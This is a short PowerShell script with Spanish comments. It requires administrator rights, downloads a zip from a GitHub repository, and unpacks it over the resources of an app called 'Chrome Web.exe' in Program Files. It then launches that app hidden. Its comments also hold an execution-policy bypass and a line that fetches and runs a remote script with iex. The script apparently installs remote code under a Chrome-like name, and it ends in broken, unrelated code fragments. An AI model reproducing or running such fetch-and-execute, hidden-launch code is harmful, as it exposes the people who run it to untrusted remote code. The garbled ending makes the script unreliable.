#HAY QUE EJECUTAR COMO ADMINISTRADOR
#Set-ExecutionPolicy -ExecutionPolicy Bypass -force
#powershell "start-process powershell -verb runas"
#powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Admo9/Source/main/asar.ps1')"


#Get-WmiObject -Class Win32_Process -Filter "name='Chrome Web.exe'" | Invoke-WmiMethod -Name Terminate

#Remove-Item -Force -Recurse 'C:\Program Files\app-64\resources\app.asar'

invoke-webrequest -uri "https://github.com/Admo9/Data/raw/main/app.zip" -outfile "C:\Users\app.zip"

Expand-Archive -Path C:\Users\app.zip -DestinationPath "C:\Program Files\app-64\resources\"

#Remove-Item -Force -Recurse 'C:\Users\win64.zip', 'C:\Users\ProJ03-main', 'C:\Users\app.zip'

Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden } |

select @{n="time";e={$_.Minutes,"Minutes",$_.Seconds,"Seconds",$_.Milliseconds,"Milliseconds" -join " "}}

